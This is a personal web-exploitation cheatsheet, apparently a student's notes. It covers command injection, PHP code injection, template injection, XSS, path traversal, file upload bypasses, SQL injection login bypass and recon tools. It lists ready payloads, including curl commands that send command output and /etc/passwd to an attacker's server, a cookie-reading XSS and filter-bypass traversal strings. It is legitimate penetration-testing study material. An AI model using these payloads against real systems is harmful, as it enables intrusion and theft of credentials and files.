# Cybersecurity Cheatsheet

## Table Of Contents

- [Cybersecurity Cheatsheet](#cybersecurity-cheatsheet)
  - [Table Of Contents](#table-of-contents)
  - [Web Exploitation](#web-exploitation)
    - [Start Hack](#start-hack)
    - [Techniques](#techniques)
  - [Command Injection](#command-injection)
    - [Useful commands](#useful-commands)
    - [Out of band in OS command injection](#out-of-band-in-os-command-injection)
      - [`curl`](#curl)
      - [`ping` and `dig`](#ping-and-dig)
  - [Code Injection](#code-injection)
  - [Server Side Template Injection](#server-side-template-injection)
  - [XSS](#xss)
    - [DOM-Based](#dom-based)
  - [Open Redirect](#open-redirect)
  - [Path Traversal](#path-traversal)
  - [File Upload](#file-upload)
  - [SQL Injection](#sql-injection)
    - [Retrieving Hidden Data](#retrieving-hidden-data)
    - [Subverting application logic](#subverting-application-logic)
  - [Recon](#recon)
  - [Handwrite Notes](#handwrite-notes)

## Web Exploitation

### Start Hack

1. Work with the website, the workflow, buttons, forms, etc.
2. [OS command injection](#command-injection)
3. Code injection
4. Server side template injection
5. XSS

### Techniques

| Key            | Description                                                      |
| -------------- | ---------------------------------------------------------------- |
| Verb Tampering | Send different methods requests to a path to see vulnerabilities |
| HTTP request   | Use hex or encode URL                                            |
| CORS           | If enabled, the best vulnerability                               |

## Command Injection

| Key                        | Description                                                 |
| -------------------------- | ----------------------------------------------------------- |
| `$ ls;pwd`                 | Run multiple commands with semicolon                        |
| `$ ls && pwd`              | If the first result command is ok, run the second           |
| `$ ls \|\| pwd`            | OR                                                          |
| `$ ls \| pwd`              | Pipe                                                        |
| `$ ls & pwd`               | & shows the PID process. But we use for multiple commands   |
| `$ ping 127.0.0.1;ls -c 1` | Inject `ls; -c 1` or `ls # -c 1` or `ls %23 -c 1` to bypass |

**No result:** what to do if we can not get the command result in response? Use the `sleep 20` command 
to find whether it has vulnerability or not

### Useful commands
When you have identified an OS command injection vulnerability, it is generally useful to execute some initial commands to obtain information about the system that you have compromised. Below is a summary of some commands that are useful on Linux and Windows platforms:

| Purpose of command    | Linux       | Windows       |
| --------------------- | ----------- | ------------- |
| Name of current user  | whoami      | whoami        |
| Operating system      | uname -a    | ver           |
| Network configuration | ifconfig    | ipconfig /all |
| Network connections   | netstat -an | netstat -an   |
| Running processes     | ps -ef      | tasklist      |

### Out of band in OS command injection

#### `curl`

1. Run a server in hacker's computer (better to bind it to `80` or `443` or `53` port)
2. Inject these commands: 
    - `$ curl <addr>/?key=value`
    - to run a command (e.g. `ls -l`) use this command `$ curl <addr> -d "$(ls -l)"`
    - to send file, use this command `$ curl <addr> -d @/etc/passwd`
3. See the logs in the server

#### `ping` and `dig`

Sometimes the HTTP protocol is not allowed, so we can use `ping` or `dig` to send data to the server. The attacker can create a DNS server to receive the data.

## Code Injection

The `eval("print (2 + 2);")` function in PHP runs a code

- e.g. `eval("ping $ip")` **bypass** by adding `"` or `'` or  
**exploit:** `";phpinfo();`

- **Comment:** Maybe we should comment the front codes. Use `//` or `#` for PHP.
- **Input limitation:** execute a shell with `system()` or `shell_exec()` or `exec()` or `aval()` in PHP.
    - e.g. `system($_GET[v])`


## Server Side Template Injection

- Tool for this vulnerability: [tplmap][1]
- Input these: `{2*2}` or `{`
- **exploit:** for PHP and Smarty engine, `{php}phpinfo(){/php}`

## XSS

Check these payloads:

- `<h1></h1>`
- `test">`
- `<script></script>`

Types of XSS:

- Reflected
- Stored
- DOM-based: e.g. `<script>document.write(document.cookie)</script>`

### DOM-Based

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, 
and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. The most common source for DOM 
XSS is the URL, which is typically accessed with the `window.location` object. An attacker can construct a link to send a victim 
to a vulnerable page with a payload in the query string and fragment portions of the URL.

use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't 
work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript.

## Open Redirect

- Header
- Redirect meta tag in HTML
- `window.location` in JavaScript

## Path Traversal

**Pattern:** www.stuff.com/?page=index.php

- Test absolute path: `/etc/passwd`
- Test path traversal: `../../../etc/passwd`
- `../../image.jpg` -> `image.jpg`: The WAF is Replacing the `../`. How to bypass? `....//....//....//etc/passwd `
- The server is concating the extension (e.x. `.jpg`): `/etc/passwd` -> `/etc/passwd.jpg`. How to bypass? Use null byte `%00` in PHP. `/etc/passwd%00.jpg` This will ignore the extension.

## File Upload

- Change the file extension in the request then put the file. Run it with http request and pass parameters.
- Maybe the back-end is checking the content-type. Just change the file extension.
- گاهی محدودیت‌هایی تعریف می‌شود که مثلا فایل `php` در هر فولدری اجرا نشود و به جای آن فقط متنش رو توی مرورگر نشون بده.
برای دور زدنش کافیه `../` باهاش ترکیب کنیم.

## SQL Injection

Double-dash sequence `--` is a comment indicator in SQL

### Retrieving Hidden Data

The query in the back-end: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

After adding the payload: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

### Subverting application logic

Consider an application that lets users log in with a username and password. If a user submits the username *wiener* and the password *bluecheese*, the application checks the credentials by performing the following SQL query:
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
For example, submitting the username `administrator'--`

## Recon

- **trufflehog:** Find credentials all over the place. [documents][2]
```bash 
$ trufflehog git https://github.com/ILoveBacteria/calculator-telegram-bot --no-update
```

- **SecLists:** The security tester's companion. [documents][3]
- **dirsearch:** A tool designed to brute force directories and files in websites. [documents][4]

## Handwrite Notes

| #     | Key           | Description                                                                 |
| ----- | ------------- | --------------------------------------------------------------------------- |
| **1** | `http.server` | Create a simple fantastic HTTP server with Python. `python3 -m http.server` |
| **2** | `dig`         | `$ dig A <addr>` find the host IP. Maybe this is a virtual host             |
| **3** | VH            | `$ curl <IP> -H "Host: <addr>"`                                             |


[1]: https://github.com/epinna/tplmap
[2]: https://github.com/trufflesecurity/trufflehog
[3]: https://github.com/danielmiessler/SecLists
[4]: https://github.com/maurosoria/dirsearch